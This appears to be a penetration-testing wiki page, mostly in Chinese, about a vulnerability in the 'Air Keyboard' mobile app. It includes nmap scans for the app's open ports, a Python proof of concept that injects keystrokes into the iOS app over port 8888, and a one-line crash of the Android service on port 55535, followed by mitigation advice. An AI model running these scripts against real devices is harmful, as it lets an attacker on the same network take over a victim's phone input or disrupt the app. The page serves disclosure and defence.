# Air Keyboard Remote Input Injection (Unauthenticated TCP Listener)

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

iOS 版本的商业 "Air Keyboard" 应用程序 (App Store ID 6463187929) 在 **8888 端口上打开了一个明文 TCP 服务**，接受 **没有任何认证** 的按键帧。  
同一 Wi-Fi 网络上的任何设备都可以连接到该端口并向受害者的手机注入任意键盘输入，从而实现 **完全的远程交互劫持**。

一个配套的 Android 版本监听 **55535 端口**。它执行一个弱 AES-ECB 握手，但构造的垃圾数据导致 **OpenSSL 解密例程中的未处理异常**，崩溃后台服务 (**DoS**)。

## 1. Service Discovery

扫描本地网络，寻找应用程序使用的两个固定端口：
```bash
# iOS (input-injection)
nmap -p 8888 --open 192.168.1.0/24

# Android (weakly-authenticated service)
nmap -p 55535 --open 192.168.1.0/24
```
在Android手机上，您可以在本地识别负责的包：
```bash
adb shell netstat -tulpn | grep 55535     # no root required on emulator

# rooted device / Termux
netstat -tulpn | grep LISTEN
ls -l /proc/<PID>/cmdline                # map PID → package name
```
## 2. 帧格式 (iOS)

该二进制文件在 `handleInputFrame()` 例程中揭示了以下解析逻辑：
```
[length (2 bytes little-endian)]
[device_id (1 byte)]
[payload ASCII keystrokes]
```
声明的长度包括 `device_id` 字节 **但不包括** 两字节头部本身。

## 3. 利用 PoC
```python
#!/usr/bin/env python3
"""Inject arbitrary keystrokes into Air Keyboard for iOS"""
import socket, sys

target_ip = sys.argv[1]                  # e.g. 192.168.1.50
keystrokes = b"open -a Calculator\n"     # payload visible to the user

frame  = bytes([(len(keystrokes)+1) & 0xff, (len(keystrokes)+1) >> 8])
frame += b"\x01"                         # device_id = 1 (hard-coded)
frame += keystrokes

with socket.create_connection((target_ip, 8888)) as s:
s.sendall(frame)
print("Injected", keystrokes)
```
任何可打印的 ASCII（包括 `\n`、`\r`、特殊键等）都可以被发送，从而有效地赋予攻击者与物理用户输入相同的权限：启动应用程序、发送即时消息、访问钓鱼 URL 等。

## 4. Android Companion – 拒绝服务

Android 端口 (55535) 期望一个用 **硬编码的 AES-128-ECB 密钥** 加密的 4 字符密码，后面跟着一个随机的 nonce。解析错误会冒泡到 `AES_decrypt()`，并未被捕获，导致监听线程终止。因此，一个单一的格式错误的数据包就足以使合法用户断开连接，直到进程重新启动。
```python
import socket
socket.create_connection((victim, 55535)).send(b"A"*32)  # minimal DoS
```
## 5. 根本原因

1. **未对传入帧进行来源/完整性检查**（iOS）。
2. **加密误用**（静态密钥，ECB，缺少长度验证）和 **缺乏异常处理**（Android）。

## 6. 缓解与加固建议

* 永远不要在移动设备上暴露未认证的服务。
* 在入职时为每个设备派生秘密，并在处理输入之前验证它们。
* 将监听器绑定到 `127.0.0.1`，并使用相互认证的加密传输（例如，TLS，Noise）进行远程控制。
* 在移动安全审查中检测意外开放的端口（`netstat`，`lsof`，`frida-trace` 在 `socket()` 等）。
* 作为最终用户：卸载 Air Keyboard 或仅在受信任的隔离 Wi-Fi 网络上使用。 

## 检测备忘单（渗透测试人员）
```bash
# Quick one-liner to locate vulnerable devices in a /24
nmap -n -p 8888,55535 --open 192.168.1.0/24 -oG - | awk '/Ports/{print $2,$3,$4}'

# Inspect running sockets on a connected Android target
adb shell "for p in $(lsof -PiTCP -sTCP:LISTEN -n -t); do echo -n \"$p → "; cat /proc/$p/cmdline; done"
```
## 参考

- [Air Keyboard iOS 应用中的远程输入注入漏洞仍未修复](https://www.mobile-hacker.com/2025/07/17/remote-input-injection-vulnerability-in-air-keyboard-ios-app-still-unpatched/)
- [CXSecurity 通告 WLB-2025060015](https://cxsecurity.com/issue/WLB-2025060015)

{{#include ../../banners/hacktricks-training.md}}
